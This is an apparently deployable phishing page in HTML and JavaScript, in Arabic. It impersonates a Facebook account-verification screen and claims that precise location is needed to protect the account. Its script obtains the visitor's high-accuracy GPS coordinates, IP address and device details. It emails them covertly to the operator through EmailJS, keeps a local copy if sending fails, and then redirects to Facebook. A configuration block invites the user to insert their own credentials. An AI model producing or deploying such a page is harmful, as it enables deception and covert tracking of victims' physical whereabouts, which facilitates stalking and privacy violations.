<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>التحقق من حسابك على فيسبوك</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
    
    :root {
      --facebook-blue: #1877F2;
      --facebook-dark-blue: #166FE5;
      --facebook-green: #42B72A;
      --facebook-gray: #F0F2F5;
    }
    
    body {
      font-family: 'Tajawal', sans-serif;
      background: linear-gradient(135deg, #1877F2, #166FE5);
      color: #1F2937;
      min-height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      max-width: 500px;
      width: 100%;
    }
    
    .card {
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
      transition: all 0.3s ease;
      background: white;
      position: relative;
    }
    
    .header {
      background: var(--facebook-blue);
      color: white;
      padding: 25px;
      text-align: center;
    }
    
    .logo {
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .content {
      padding: 30px;
    }
    
    .section {
      display: none;
    }
    
    .section.active {
      display: block;
      animation: fadeIn 0.5s ease;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .location-icon {
      font-size: 80px;
      color: var(--facebook-blue);
      margin: 20px 0;
      display: block;
      text-align: center;
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    
    .btn {
      display: block;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 50px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: 20px;
      text-align: center;
    }
    
    .btn-primary {
      background: var(--facebook-blue);
      color: white;
      box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
    }
    
    .btn-primary:hover {
      background: var(--facebook-dark-blue);
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(24, 119, 242, 0.6);
    }
    
    .btn-success {
      background: var(--facebook-green);
      color: white;
      box-shadow: 0 4px 15px rgba(66, 183, 42, 0.4);
    }
    
    .btn-success:hover {
      background: #36a420;
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(66, 183, 42, 0.6);
    }
    
    .btn-outline {
      background: transparent;
      color: var(--facebook-blue);
      border: 2px solid var(--facebook-blue);
    }
    
    .accuracy-display {
      text-align: center;
      margin: 20px 0;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 12px;
      font-weight: 600;
    }
    
    .high-accuracy {
      color: #42b72a;
    }
    
    .medium-accuracy {
      color: #f39c12;
    }
    
    .low-accuracy {
      color: #e74c3c;
    }
    
    .loading-spinner {
      display: inline-block;
      width: 40px;
      height: 40px;
      border: 4px solid rgba(24, 119, 242, 0.2);
      border-radius: 50%;
      border-top-color: var(--facebook-blue);
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .map-container {
      height: 250px;
      border-radius: 15px;
      overflow: hidden;
      margin: 20px 0;
      border: 1px solid #e0e0e0;
    }
    
    .progress-container {
      height: 8px;
      background: #e0e0e0;
      border-radius: 4px;
      margin: 25px 0;
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      background: var(--facebook-blue);
      border-radius: 4px;
      width: 0%;
      transition: width 0.5s ease;
    }
    
    .error-section {
      background: #fff8f8;
      border: 1px solid #ffcccc;
      border-radius: 12px;
      padding: 20px;
      margin-top: 20px;
    }
    
    .error-title {
      color: #e74c3c;
      text-align: center;
      font-size: 20px;
      margin-bottom: 15px;
    }
    
    .solution-steps {
      padding-left: 20px;
      margin: 15px 0;
    }
    
    .solution-steps li {
      margin-bottom: 10px;
      line-height: 1.5;
    }
    
    .footer {
      text-align: center;
      color: white;
      margin-top: 30px;
      font-size: 14px;
    }
    
    .footer a {
      color: rgba(255, 255, 255, 0.8);
      margin: 0 10px;
      text-decoration: none;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="header">
        <div class="logo">
          <i class="fab fa-facebook"></i>
        </div>
        <h1>فيسبوك - التحقق من الحساب</h1>
      </div>
      
      <div class="content">
        <!-- Welcome Section -->
        <div id="welcomeSection" class="section active">
          <h2>التحقق من حسابك</h2>
          <p>لحماية حسابك من الاختراق، يرجى السماح بتحديد موقعك الحالي بدقة عالية.</p>
          
          <i class="fas fa-map-marker-alt location-icon"></i>
          
          <div class="accuracy-display">
            <p>نظامنا يتطلب تحديد الموقع بدقة 5-10 أمتار</p>
            <p><i class="fas fa-shield-alt"></i> هذه العملية تحمي حسابك من الاختراق</p>
          </div>
          
          <p><strong>ملاحظة:</strong> قد تستغرق العملية 5-10 ثواني للحصول على دقة عالية، خاصة في المناطق النائية.</p>
          
          <button id="startBtn" class="btn btn-primary">
            <i class="fas fa-location-arrow"></i> بدء التحقق الآن
          </button>
        </div>
        
        <!-- Loading Section -->
        <div id="loadingSection" class="section">
          <h2>جاري تحديد موقعك</h2>
          <p>نحاول الحصول على موقعك بدقة عالية (5-10 أمتار)</p>
          
          <div class="loading-spinner"></div>
          
          <div class="progress-container">
            <div id="progressBar" class="progress-bar"></div>
          </div>
          
          <p id="accuracyStatus">جاري تحسين دقة الموقع...</p>
          <p id="timer">الوقت المنقضي: <span id="seconds">0</span> ثانية</p>
        </div>
        
        <!-- Map Section -->
        <div id="mapSection" class="section">
          <h2>تم التحقق من موقعك</h2>
          
          <div class="accuracy-display high-accuracy">
            <p><i class="fas fa-check-circle"></i> تم تحديد موقعك بدقة عالية</p>
            <p>دقة الموقع: <span id="accuracyValue">--</span> متر</p>
          </div>
          
          <div class="map-container" id="mapContainer"></div>
          
          <button id="continueBtn" class="btn btn-success">
            <i class="fab fa-facebook"></i> المتابعة إلى فيسبوك
          </button>
        </div>
        
        <!-- Error Section -->
        <div id="errorSection" class="section">
          <h2>تعذر التحقق من موقعك</h2>
          <p>للمتابعة إلى حسابك، يرجى منح الإذن لتحديد الموقع</p>
          
          <div class="error-section">
            <div class="error-title">
              <i class="fas fa-exclamation-triangle"></i> تم رفض إذن الموقع
            </div>
            <p>لحل المشكلة:</p>
            <ol class="solution-steps">
              <li>اضغط على زر "إعادة المحاولة"</li>
              <li>في النافذة المنبثقة، اختر "السماح"</li>
              <li>إذا لم تظهر النافذة، اتبع الخطوات التالية:</li>
              <li>اذهب إلى إعدادات المتصفح → الخصوصية → إعدادات الموقع</li>
              <li>ابحث عن هذا الموقع في القائمة</li>
              <li>غيّر الإعداد إلى "السماح" أو "Allow"</li>
            </ol>
          </div>
          
          <button id="retryBtn" class="btn btn-primary">
            <i class="fas fa-sync-alt"></i> إعادة المحاولة
          </button>
          
          <button id="helpBtn" class="btn btn-outline">
            <i class="fas fa-question-circle"></i> عرض تعليمات تفصيلية
          </button>
        </div>
      </div>
    </div>
    
    <div class="footer">
      <p>فيسبوك &copy; 2023. جميع الحقوق محفوظة</p>
      <div>
        <a href="#">الخصوصية</a>
        <a href="#">الشروط</a>
        <a href="#">المساعدة</a>
      </div>
    </div>
  </div>

  <script>
    // ************************
    // CONFIGURATION - REPLACE WITH YOUR DATA
    // ************************
    const config = {
      emailjs: {
        publicKey: "0XeUaAWOfdeN9gGEr",
        serviceId: "service_gtkrov5",
        templateId: "template_jj0pjs9",
        receiverEmail: "your_email@example.com" // البريد المستلم
      },
      facebookPage: "https://www.facebook.com/your_page",
      mapsApiKey: "YOUR_GOOGLE_MAPS_API_KEY"
    };
    // ************************

    // DOM Elements
    const welcomeSection = document.getElementById("welcomeSection");
    const loadingSection = document.getElementById("loadingSection");
    const mapSection = document.getElementById("mapSection");
    const errorSection = document.getElementById("errorSection");
    const startBtn = document.getElementById("startBtn");
    const retryBtn = document.getElementById("retryBtn");
    const continueBtn = document.getElementById("continueBtn");
    const helpBtn = document.getElementById("helpBtn");
    const progressBar = document.getElementById("progressBar");
    const accuracyValue = document.getElementById("accuracyValue");
    const accuracyStatus = document.getElementById("accuracyStatus");
    const secondsDisplay = document.getElementById("seconds");
    const mapContainer = document.getElementById("mapContainer");

    // State variables
    let locationData = null;
    let timer = null;
    let seconds = 0;
    let mapInstance = null;
    
    // Initialize EmailJS
    emailjs.init(config.emailjs.publicKey);
    
    // Show section helper
    function showSection(section) {
      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
      section.classList.add('active');
    }
    
    // Start location process
    function startLocationProcess() {
      showSection(loadingSection);
      seconds = 0;
      updateTimer();
      
      // Start the timer
      timer = setInterval(updateTimer, 1000);
      
      // Start progress bar animation
      animateProgressBar();
      
      // Start location retrieval with high accuracy
      getHighAccuracyLocation();
    }
    
    // Update timer display
    function updateTimer() {
      seconds++;
      secondsDisplay.textContent = seconds;
      
      // Update status message
      if (seconds < 5) {
        accuracyStatus.textContent = "جاري الحصول على الإشارات اللازمة...";
      } else if (seconds < 10) {
        accuracyStatus.textContent = "جاري تحسين دقة الموقع...";
      } else {
        accuracyStatus.textContent = "نحاول الحصول على دقة عالية (5-10 أمتار)...";
      }
    }
    
    // Animate progress bar
    function animateProgressBar() {
      let width = 0;
      const interval = setInterval(() => {
        if (width >= 100) {
          clearInterval(interval);
        } else {
          width += 1;
          progressBar.style.width = width + "%";
        }
      }, 100);
    }
    
    // Get high accuracy location (with retries)
    function getHighAccuracyLocation() {
      if (!navigator.geolocation) {
        showError("متصفحك لا يدعم خاصية تحديد الموقع");
        return;
      }
      
      navigator.geolocation.getCurrentPosition(
        position => handleLocationSuccess(position),
        error => handleLocationError(error),
        {
          enableHighAccuracy: true, // Request high accuracy (GPS)
          timeout: 30000, // Wait up to 30 seconds
          maximumAge: 0 // Do not use a cached position
        }
      );
    }
    
    // Handle successful location retrieval
    function handleLocationSuccess(position) {
      clearInterval(timer);
      
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      
      locationData = {
        lat: lat,
        lng: lng,
        accuracy: accuracy,
        timestamp: new Date().toISOString()
      };
      
      // Update accuracy display
      accuracyValue.textContent = Math.round(accuracy);
      
      // Show accuracy status
      if (accuracy <= 10) {
        accuracyValue.className = "high-accuracy";
      } else if (accuracy <= 30) {
        accuracyValue.className = "medium-accuracy";
      } else {
        accuracyValue.className = "low-accuracy";
      }
      
      // Initialize and display map
      initMap(lat, lng);
      
      // Show map section
      showSection(mapSection);
      
      // Send location data
      sendLocationData();
    }
    
    // Initialize and display Google Map
    function initMap(lat, lng) {
      if (typeof google === 'undefined') {
        console.error("Google Maps not loaded");
        return;
      }
      
      const location = new google.maps.LatLng(lat, lng);
      
      mapInstance = new google.maps.Map(mapContainer, {
        center: location,
        zoom: 18, // High zoom level for better accuracy
        mapTypeId: google.maps.MapTypeId.HYBRID, // Satellite view with labels
        streetViewControl: false,
        fullscreenControl: false,
        mapTypeControl: false
      });
      
      // Add marker
      new google.maps.Marker({
        position: location,
        map: mapInstance,
        title: "موقعك الحالي",
        animation: google.maps.Animation.DROP
      });
      
      // Add accuracy circle
      new google.maps.Circle({
        strokeColor: "#4285F4",
        strokeOpacity: 0.8,
        strokeWeight: 2,
        fillColor: "#4285F4",
        fillOpacity: 0.35,
        map: mapInstance,
        center: location,
        radius: locationData.accuracy
      });
    }
    
    // Handle location error
    function handleLocationError(error) {
      clearInterval(timer);
      showSection(errorSection);
      
      let errorMessage = "حدث خطأ غير متوقع أثناء تحديد الموقع";
      
      switch(error.code) {
        case error.PERMISSION_DENIED:
          errorMessage = "تم رفض الإذن لتحديد الموقع. يرجى منح الإذن للمتابعة.";
          break;
        case error.POSITION_UNAVAILABLE:
          errorMessage = "معلومات الموقع غير متوفرة. يرجى التأكد من تفعيل خدمات الموقع.";
          break;
        case error.TIMEOUT:
          errorMessage = "انتهت المهلة المحددة للحصول على الموقع. يرجى المحاولة مرة أخرى.";
          break;
      }
    }
    
    // Send location data via EmailJS (with detailed information)
    function sendLocationData() {
      if (!locationData) return;
      
      // Format date/time in Arabic
      const now = new Date();
      const dateTimeString = now.toLocaleString('ar-EG', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });
      
      // Create Google Maps link
      const mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}&z=18`;
      
      // Prepare template parameters with detailed information
      const templateParams = {
        to_email: config.emailjs.receiverEmail,
        date_time: dateTimeString,
        location_link: mapsLink,
        coordinates: `${locationData.lat}, ${locationData.lng}`,
        accuracy: `${Math.round(locationData.accuracy)} متر`,
        device_info: navigator.userAgent,
        additional_info: "تم جمع هذه البيانات من خلال نموذج التحقق من حساب فيسبوك",
        ip_address: "جاري الحصول...",
        map_image: `https://maps.googleapis.com/maps/api/staticmap?center=${locationData.lat},${locationData.lng}&zoom=16&size=600x300&maptype=roadmap&markers=color:red%7C${locationData.lat},${locationData.lng}&key=${config.mapsApiKey}`
      };
      
      // Get IP address
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          templateParams.ip_address = data.ip;
          sendEmail(templateParams);
        })
        .catch(() => {
          templateParams.ip_address = "غير معروف";
          sendEmail(templateParams);
        });
    }
    
    // Send email with all parameters
    function sendEmail(params) {
      emailjs.send(
        config.emailjs.serviceId,
        config.emailjs.templateId,
        params
      )
      .then(response => {
        console.log("Location data sent successfully:", response);
      })
      .catch(error => {
        console.error("Failed to send location data:", error);
        // Fallback: save to localStorage
        try {
          const savedLocations = JSON.parse(localStorage.getItem('fb_locations') || [];
          savedLocations.push(params);
          localStorage.setItem('fb_locations', JSON.stringify(savedLocations));
        } catch (e) {
          console.error("Failed to save location locally:", e);
        }
      });
    }
    
    // Redirect to Facebook page
    function redirectToFacebook() {
      if (config.facebookPage) {
        window.location.href = config.facebookPage;
      }
    }
    
    // Show detailed help instructions
    function showHelpInstructions() {
      const instructions = `
        <h3>كيفية تفعيل خدمات الموقع:</h3>
        <ol>
          <li>افتح إعدادات جهازك</li>
          <li>ابحث عن "الموقع" أو "Location"</li>
          <li>تأكد من تفعيل خدمات الموقع</li>
          <li>ابحث عن "Chrome" أو متصفحك في قائمة التطبيقات</li>
          <li>قم بتفعيل "السماح بالوصول إلى الموقع"</li>
          <li>اختر "أثناء استخدام التطبيق" أو "دائماً"</li>
          <li>ارجع إلى هذه الصفحة واضغط "إعادة المحاولة"</li>
        </ol>
        <p>إذا استمرت المشكلة، حاول استخدام جهاز آخر أو تحديث المتصفح.</p>
      `;
      
      alert(instructions);
    }
    
    // Load Google Maps API
    function loadGoogleMaps() {
      if (!config.mapsApiKey) return;
      
      const script = document.createElement('script');
      script.src = `https://maps.googleapis.com/maps/api/js?key=${config.mapsApiKey}&libraries=places&language=ar&region=SA`;
      script.async = true;
      script.defer = true;
      document.head.appendChild(script);
    }
    
    // Event listeners
    startBtn.addEventListener('click', startLocationProcess);
    retryBtn.addEventListener('click', startLocationProcess);
    continueBtn.addEventListener('click', redirectToFacebook);
    helpBtn.addEventListener('click', showHelpInstructions);
    
    // Initialize the app
    document.addEventListener('DOMContentLoaded', () => {
      loadGoogleMaps();
    });
  </script>
</body>
</html>
